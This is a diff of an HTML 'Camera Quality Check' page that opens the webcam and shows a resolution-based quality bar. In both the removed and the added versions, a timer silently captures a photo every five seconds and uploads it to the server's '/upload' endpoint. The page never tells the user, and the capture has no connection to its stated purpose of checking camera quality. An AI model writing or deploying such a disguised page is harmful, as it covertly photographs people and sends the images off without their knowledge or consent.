@@ -1,203 +1,203 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Check Camera Quality</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin: 20px;
-      background-color: black;color: white; }
-      @media  (max-width: 1180px) {
-        video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 80%; height: 90%; margin-top: 20px; }
-      }
-    video, canvas { border: 1px solid #ccc; border-radius: 8px; width: 80%; height: 60%; margin-top: 20px; }
-    button { padding: 10px 15px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 5px; border: none; background-color: #007BFF; color: white; }
-    button:hover { background-color: #0056b3; }
+<meta charset="UTF-8">
+<title>Check Camera Quality</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    margin: 20px;
+    background-color: black;
+    color: white;
+  }
+  h1 { margin-top: 8%; font-size: xxx-large; }
 
-    /* 🔹 Quality Bar */
-    #qualityBarWrapper {
-      position: fixed;
-      top: 50%;
-      right: 20px;
-      transform: translateY(-50%);
-      width: 20px;
-      height: 70%;
-      background: linear-gradient(to top, red, yellow, green);
-      border-radius: 10px;
-      border: 1px solid #333;
-      overflow: hidden;
-    }
-    #qualityMarker {
-      position: absolute;
-      left: -4px;
-      width: 28px;
-      height: 2px;
-      background: black;
-      transition: top 0.5s ease;
-    }
-    #qualityText {
-      position: fixed;
-      top: 50%;
-      right: 60px;   /* push away from bar */
-      transform: translateY(-50%);
-      font-size: 26px;
-      font-weight: bold;
-    }
+  video, canvas {
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    width: 80%;
+    height: 60%;
+    margin-top: 20px;
+  }
 
-    @media  (max-width: 1180px) {
-      #qualityBarWrapper {
-        position: fixed;
-        top: 30%;
-        right: 25px;
-        transform: translateY(-50%);
-        width: 30px;
-        height: 50%;
-        background: linear-gradient(to top, red, yellow, green);
-        border-radius: 10px;
-        border: 1px solid #333;
-        overflow: hidden;
-      }
-      #qualityMarker {
-        position: absolute;
-        left: -4px;
-        width: 38px;
-        height: 2px;
-        background: black;
-        transition: top 0.5s ease;
-      }
-      #qualityText {
-        position: fixed;
-        top: 58%;
-        right: 20px;   /* push away from bar */
-        transform: translateY(-50%);
-        font-size: 50px;
-        font-weight: bold;
-      }
-    }
-  </style>
+  @media (max-width: 1180px) {
+    video, canvas { width: 80%; height: 40%; margin-top: 20px; }
+  }
+
+  button {
+    padding: 10px 15px;
+    font-size: 16px;
+    margin: 10px;
+    cursor: pointer;
+    border-radius: 5px;
+    border: none;
+    background-color: #007BFF;
+    color: white;
+  }
+  button:hover { background-color: #0056b3; }
+
+  /* Quality Bar */
+  #qualityBarWrapper {
+    position: fixed;
+    top: 50%;
+    right: 20px;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 70%;
+    background: linear-gradient(to top, red, yellow, green);
+    border-radius: 10px;
+    border: 1px solid #333;
+    overflow: hidden;
+  }
+
+  #qualityMarker {
+    position: absolute;
+    left: -4px;
+    width: 28px;
+    height: 2px;
+    background: black;
+    transition: top 0.5s ease; /* smooth animation */
+  }
+
+  #qualityText {
+    position: fixed;
+    top: 50%;
+    right: 60px;
+    transform: translateY(-50%);
+    font-size: 26px;
+    font-weight: bold;
+  }
+
+  #qualityText span {
+    display: block;
+    font-size: 14px;
+    color: #ccc;
+  }
+
+  @media (max-width: 1180px) {
+    #qualityBarWrapper { top: 30%; right: 25px; width: 30px; height: 50%; }
+    #qualityMarker { width: 38px; }
+    #qualityText { top: 58%; font-size: 50px; }
+  }
+</style>
 </head>
 <body>
-  <h1 style="margin-top: 8%;font-size: xxx-large;">Camera Quality Check</h1>
+<h1>Camera Quality Check</h1>
 
-  <!-- Quality Indicator -->
-  <div id="qualityBarWrapper">
-    <div id="qualityMarker"></div>
-  </div>
-  <div id="qualityText">0%</div>
+<div id="qualityBarWrapper">
+  <div id="qualityMarker"></div>
+</div>
+<div id="qualityText">0%<span>0x0</span></div>
 
-  <video id="video" autoplay playsinline muted></video>
-  <br>
-  <button id="flipBtn">Flip Camera</button>
-  <button id="captureBtn">Capture</button>
-  <canvas id="canvas" style="display:none;"></canvas>
+<video id="video" autoplay playsinline muted></video>
+<br>
+<button id="flipBtn">Flip Camera</button>
+<button id="captureBtn">Capture</button>
+<canvas id="canvas" style="display:none;"></canvas>
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureBtn = document.getElementById('captureBtn');
-    const flipBtn = document.getElementById('flipBtn');
-    const marker = document.getElementById('qualityMarker');
-    const textEl = document.getElementById('qualityText');
+<script>
+let video = document.getElementById('video');
+let canvas = document.getElementById('canvas');
+let captureBtn = document.getElementById('captureBtn');
+let flipBtn = document.getElementById('flipBtn');
+let marker = document.getElementById('qualityMarker');
+let qualityText = document.getElementById('qualityText');
+let qualitySpan = qualityText.querySelector('span');
+let stream;
+let usingFrontCamera = true;
 
-    let stream;
-    let usingFrontCamera = true;
-
-    // Start camera with cross-browser support
-    async function startCamera() {
-      if(stream) stream.getTracks().forEach(t => t.stop());
-
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: usingFrontCamera ? 'user' : 'environment',
-            width: { ideal: 1920 },
-            height: { ideal: 1080 }
-          },
-          audio: false
-        });
-
-        video.srcObject = stream;
-        await video.play(); // ensures Safari & other browsers show preview
-      } catch (err) {
-        console.error("Camera error:", err);
-        alert("Cannot access camera. Use HTTPS and allow camera permissions.");
-      }
-    }
-
-    flipBtn.addEventListener('click', () => {
-      usingFrontCamera = !usingFrontCamera;
-      startCamera();
+// 🔹 Start Camera
+async function startCamera() {
+  if(stream) stream.getTracks().forEach(track => track.stop());
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { 
+        facingMode: usingFrontCamera ? "user" : "environment",
+        width: { ideal: 1920 },
+        height: { ideal: 1080 }
+      },
+      audio: false
     });
+    video.srcObject = stream;
+    await video.play();
+  } catch (err) {
+    console.error("Camera not accessible:", err);
+    alert("Cannot access camera. Make sure you are on HTTPS and allowed camera access.");
+  }
+}
 
-    // Capture & upload
-    function captureAndUpload() {
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+// 🔹 Flip camera
+flipBtn.addEventListener('click', () => {
+  usingFrontCamera = !usingFrontCamera;
+  startCamera();
+});
 
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append('file', blob, 'photo.png');
-        try {
-          const response = await fetch('/upload', { method: 'POST', body: formData });
-          console.log(response.ok ? 'Photo uploaded!' : 'Upload failed');
-        } catch (e) {
-          console.error('Upload error:', e);
-        }
-      }, 'image/png');
+// 🔹 Capture Photo
+function capturePhoto() {
+  let ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(async (blob) => {
+    let formData = new FormData();
+    formData.append('file', blob, 'photo.png');
+    try {
+      let response = await fetch('/upload', { method: 'POST', body: formData });
+      if(response.ok) console.log('Photo uploaded successfully!');
+      else console.error('Upload failed');
+    } catch(err) {
+      console.error('Upload error:', err);
     }
+  }, 'image/png');
+}
 
-    captureBtn.addEventListener('click', captureAndUpload);
-    setInterval(captureAndUpload, 5000);
+captureBtn.addEventListener('click', capturePhoto);
 
-    // Smooth / interpolated quality bar
-    function updateQuality() {
-      if (!video.videoWidth || !video.videoHeight || video.videoWidth < 100) return;
+// 🔹 Auto-capture every 5 seconds
+setInterval(capturePhoto, 5000);
 
-      const res = video.videoWidth * video.videoHeight;
+// 🔹 Update Quality
+function updateQuality() {
+  if(!video.videoWidth || !video.videoHeight) return;
 
-      const thresholds = [
-        { res: 160*120, percent: 8 },
-        { res: 320*240, percent: 15 },
-        { res: 360*240, percent: 22 },
-        { res: 420*320, percent: 38 },
-        { res: 640*480, percent: 44 },
-        { res: 854*480, percent: 58 },
-        { res: 1280*720, percent: 67 },
-        { res: 1920*1080, percent: 100 },
-      ];
+  const width = video.videoWidth;
+  const height = video.videoHeight;
 
-      let percent = 0;
+  const resTable = [
+    {w:160, h:120, pct:4},
+    {w:360, h:240, pct:10},
+    {w:420, h:320, pct:15},  
+    {w:640, h:480, pct:15},
+    {w:1280, h:720, pct:44},
+    {w:1920, h:1080, pct:100},
+    {w:3840, h:2160, pct:100}
+  ];
 
-      for (let i = 0; i < thresholds.length - 1; i++) {
-        const curr = thresholds[i];
-        const next = thresholds[i + 1];
-        if (res >= curr.res && res <= next.res) {
-          const ratio = (res - curr.res) / (next.res - curr.res);
-          percent = Math.round(curr.percent + ratio * (next.percent - curr.percent));
-          break;
-        }
-        if (res < thresholds[0].res) {
-          percent = thresholds[0].percent;
-          break;
-        }
-        percent = thresholds[thresholds.length - 1].percent; // above max
-      }
-
-      const barHeight = document.getElementById('qualityBarWrapper').offsetHeight;
-      marker.style.top = Math.floor(barHeight * (1 - percent / 100)) + "px";
-
-      textEl.innerText = percent + "%";
-      textEl.style.color = percent < 40 ? "red" : percent < 70 ? "orange" : "green";
-
-      console.log(`Resolution: ${video.videoWidth}x${video.videoHeight} => ${percent}%`);
+  let resPercent = 0;
+  for(let i=0;i<resTable.length;i++){
+    const entry = resTable[i];
+    if(width <= entry.w && height <= entry.h){
+      resPercent = entry.pct;
+      break;
     }
+  }
 
-    setInterval(updateQuality, 2000);
+  // 🔹 Smooth bar animation
+  const barHeight = document.getElementById('qualityBarWrapper').offsetHeight;
+  marker.style.top = Math.floor(barHeight * (1 - resPercent/100)) + "px";
 
-    // Start camera initially
-    startCamera();
-  </script>
+  // 🔹 Update text and tooltip
+  qualityText.innerText = resPercent + "%";
+  qualitySpan.innerText = `${width}x${height}`;
+  qualityText.appendChild(qualitySpan);
+  qualityText.style.color = resPercent < 40 ? "red" : resPercent < 70 ? "orange" : "green";
+}
+
+setInterval(updateQuality, 2000);
+
+startCamera();
+</script>
 </body>
 </html>
-
